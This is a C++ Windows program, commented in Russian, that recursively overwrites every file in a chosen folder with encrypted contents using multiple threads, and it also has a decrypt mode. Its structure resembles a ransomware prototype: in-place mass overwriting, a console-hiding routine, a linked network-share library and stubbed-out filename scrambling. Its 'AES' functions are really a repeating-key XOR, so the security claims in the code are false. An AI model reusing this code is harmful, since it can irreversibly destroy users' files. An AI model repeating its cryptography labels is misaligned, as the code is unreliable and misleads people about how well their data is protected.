#include <iostream>
#include <vector>
#include <string>
#include <stdexcept>
#include <fstream>
#include <random>
#include <algorithm>
#include <iomanip> // Для std::hex
#include <cstdlib>
#include <ctime>
#include <windows.h>
#include <iomanip> // Для std::setw и std::setfill
#include <sstream> // Для std::stringstream
#include <Wincrypt.h>
#include <cstdio> // Для функции rename
#include <thread> // Для многопоточности
#include <mutex> // Для мьютексов
#include <winnetwk.h>
#include "ThreadPool.h"
#pragma comment(lib, "mpr.lib")
// Ключ для шифрования и дешифрования данных (128 бит)
std::mutex console_mutex; // Мьютекс для синхронизации вывода в консоль
using namespace std;
constexpr size_t AES_KEY_SIZE = 16;

// Функция для генерации случайного ключа
std::vector<unsigned char> generateRandomKey() {
    std::vector<unsigned char> key(AES_KEY_SIZE);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<unsigned short> distrib(0, 255);
    std::generate(key.begin(), key.end(), [&]() { return distrib(gen); });
    return key;
}

// Функция для шифрования данных с использованием AES
std::vector<unsigned char> encryptAES(const std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    std::vector<unsigned char> encryptedData(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        encryptedData[i] = data[i] ^ key[i % AES_KEY_SIZE];
    }
    return encryptedData;
}

// Функция для дешифрования данных с использованием AES
std::vector<unsigned char> decryptAES(const std::vector<unsigned char>& encryptedData, const std::vector<unsigned char>& key) {
    std::vector<unsigned char> decryptedData(encryptedData.size());
    for (size_t i = 0; i < encryptedData.size(); ++i) {
        decryptedData[i] = encryptedData[i] ^ key[i % AES_KEY_SIZE];
    }
    return decryptedData;
}

// Функция для вывода данных в шестнадцатеричном виде
void printHex(const std::vector<unsigned char>& data) {
    for (unsigned char byte : data) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
    }
    std::cout << std::dec;
}

// Функция для чтения данных из файла
std::vector<unsigned char> readFromFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Failed to open file: " + filename);
    }

    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<unsigned char> data(fileSize);
    file.read(reinterpret_cast<char*>(data.data()), fileSize);
    if (!file) {
        throw std::runtime_error("Failed to read from file: " + filename);
    }

    return data;
}

// Функция для записи данных в файл
void writeToFile(const std::string& filename, const std::vector<unsigned char>& data) {
    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Failed to create file: " + filename);
    }

    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    if (!file) {
        throw std::runtime_error("Failed to write to file: " + filename);
    }
    file.close();
}

// Функция для шифрования файла и переименования
void encryptAndRenameFile(const std::string& filename, const std::vector<unsigned char>& key) {
    try {
        // Получение имени файла из полного пути
        size_t pos = filename.find_last_of("/\\");
        std::string fileOnly = (pos != std::string::npos) ? filename.substr(pos + 1) : filename;

        // Чтение данных из файла
        std::vector<unsigned char> data = readFromFile(filename);

        // Шифрование данных
        std::vector<unsigned char> encryptedData = encryptAES(data, key);

        // Получение зашифрованного имени файла
        std::vector<unsigned char> encryptedFilename = encryptAES(std::vector<unsigned char>(fileOnly.begin(), fileOnly.end()), key);

        // Запись зашифрованных данных в исходный файл
        writeToFile(filename, encryptedData);

        //// Переименование исходного файла
        //std::string encryptedFilenameStr(encryptedFilename.begin(), encryptedFilename.end());
        //if (std::rename(filename.c_str(), encryptedFilenameStr.c_str()) != 0) {
        //    throw std::runtime_error("Failed to rename file.");
        //}
        std::lock_guard<std::mutex> lock(console_mutex);
        std::cout << fileOnly << " encrypted" << std::endl;
    }
    catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(console_mutex);
        std::cerr << "Error: " << e.what() << std::endl;
    }
}
// Функция для дешифрования файла и восстановления имени
void decryptAndRenameFile(const std::string& filename, const std::vector<unsigned char>& key) {
    try {
        // Получение имени файла из полного пути
        size_t pos = filename.find_last_of("/\\");
        std::string fileOnly = (pos != std::string::npos) ? filename.substr(pos + 1) : filename;

        // Чтение зашифрованных данных из файла
        std::vector<unsigned char> encryptedData = readFromFile(filename);

        // Дешифрование данных
        std::vector<unsigned char> decryptedData = decryptAES(encryptedData, key);

        // Получение дешифрованного имени файла
        std::vector<unsigned char> decryptedFilename = decryptAES(std::vector<unsigned char>(fileOnly.begin(), fileOnly.end()), key);

        // Запись дешифрованных данных в исходный файл
        writeToFile(filename, decryptedData);

        // Переименование исходного файла обратно
        /*std::string decryptedFilenameStr(decryptedFilename.begin(), decryptedFilename.end());
        if (std::rename(filename.c_str(), decryptedFilenameStr.c_str()) != 0) {
            throw std::runtime_error("Failed to rename file.");
        }*/

        std::lock_guard<std::mutex> lock(console_mutex);
        std::cout << fileOnly << " decrypted" << std::endl;
    }
    catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(console_mutex);
        std::cerr << "Error: " << e.what() << std::endl;
    }
}
void processDirectoryEncrypt(const string& dirPath, vector<thread>& threads, const std::vector<unsigned char>& key) {
    ThreadPool pool(5);
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;

    string searchPath = dirPath + "\\*";
    hFind = FindFirstFileA(searchPath.c_str(), &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            string name = findFileData.cFileName;
            if (name != "." && name != "..") {
                string fullPath = dirPath + "\\" + name;
                if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    processDirectoryEncrypt(fullPath, threads, key); // Рекурсивно обрабатываем поддиректории
                }
                else {
                  pool.enqueue(encryptAndRenameFile, fullPath, key); // Создаем поток для обработки файла
                }
            }
        } while (FindNextFileA(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
    else {
        {
            std::lock_guard<std::mutex> lock(console_mutex);
            cerr << "Open directory error: " << dirPath << endl;
        }
    }
}
void processDirectoryDecrypt(const string& dirPath, vector<thread>& threads, const std::vector<unsigned char>& key) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind;
    ThreadPool pool(5);
    string searchPath = dirPath + "\\*";
    hFind = FindFirstFileA(searchPath.c_str(), &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            string name = findFileData.cFileName;
            if (name != "." && name != "..") {
                string fullPath = dirPath + "\\" + name;
                if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    processDirectoryDecrypt(fullPath, threads, key); // Рекурсивно обрабатываем поддиректории
                }
                else {
                    pool.enqueue(decryptAndRenameFile, fullPath, key); // Создаем поток для обработки файла
                }
            }
        } while (FindNextFileA(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
    else {
        {
            std::lock_guard<std::mutex> lock(console_mutex);
            cerr << "Open directory error: " << dirPath << endl;
        }
    }
}
void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}
int main() {
    try {
        std::string filepathbuffer;
        std::cout << "Enter path to folder: ";
        std::getline(std::cin, filepathbuffer);
        const string filepath = filepathbuffer; // Полный путь к файлу для шифрования
        std::string result;
        for (char c : filepath) {
            if (c != '"') {
                result += c;
            }
        }
        // Файл для шифрования и переименования
        std::string inputFile = result; // Пример для изображения, замените тип файла при необходимости

        // Генерация случайного ключа
        //string keyStr = "95abba925bb66acf3503fcb1fa16fd84";
        //std::vector<unsigned char> decryptKey;
        //for (size_t i = 0; i < keyStr.size(); i += 2) {
        //    std::string byteString = keyStr.substr(i, 2);
        //    unsigned char byte = static_cast<unsigned char>(std::stoi(byteString, 0, 16));
        //    decryptKey.push_back(byte);
        //}
        std::vector<unsigned char> key = generateRandomKey();
        std::vector<std::vector<unsigned char>> keys;
        int numEncrypts = 1; // количество шифрований
        std::cout << "Enter number of encrypts: ";
        std::cin >> numEncrypts;

        std::cout << "Generated AES Keys:\n";
        for (int i = 0; i < numEncrypts; ++i) {
            keys.push_back(generateRandomKey());
            printHex(keys.back());
        }

        std::cout << "\nChoose type:\n1: Encrypt\n2: Decrypt\n>> ";
        int choice = 2;
        std::cin >> choice;

        if (choice == 1) {
            // Шифрование файла и переименование
            for (int i = 0; i < keys.size(); i++)
            {
                vector<thread> threads;
                /*encryptAndRenameFile(inputFile, key);*/
                processDirectoryEncrypt(inputFile, threads, keys[i]);
                // Ожидание завершения всех потоков
                for (auto& t : threads) {
                    if (t.joinable()) {
                        t.join();
                    }
                }
            }
            
        }
        else if (choice == 2) {
            // Ввод ключа для дешифрования
            std::string longKey;
            std::cout << "Enter AES Key for decryption: ";
            std::cin >> longKey;

            // Разделение длинного ключа на отдельные ключи по 16 символов каждый
            std::vector<std::vector<unsigned char>> keys;
            for (size_t i = 0; i < longKey.size(); i += AES_KEY_SIZE * 2) {
                std::string subKey = longKey.substr(i, AES_KEY_SIZE * 2);
                std::vector<unsigned char> key;
                for (size_t j = 0; j < subKey.size(); j += 2) {
                    std::string byteString = subKey.substr(j, 2);
                    unsigned char byte = static_cast<unsigned char>(std::stoi(byteString, 0, 16));
                    key.push_back(byte);
                }
                keys.push_back(key);
            }
            for (int i = 0; i < keys.size(); i++)
            {
                vector<thread> threads;
                /*encryptAndRenameFile(inputFile, key);*/
                processDirectoryDecrypt(inputFile, threads, keys[i]);
                // Ожидание завершения всех потоков
                for (auto& t : threads) {
                    if (t.joinable()) {
                        t.join();
                    }
                }
            }
           
        }
        else {
            std::cerr << "Invalid choice. Please enter 1 or 2." << std::endl;
            return 1;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    Sleep(3000);
    return 0;
}
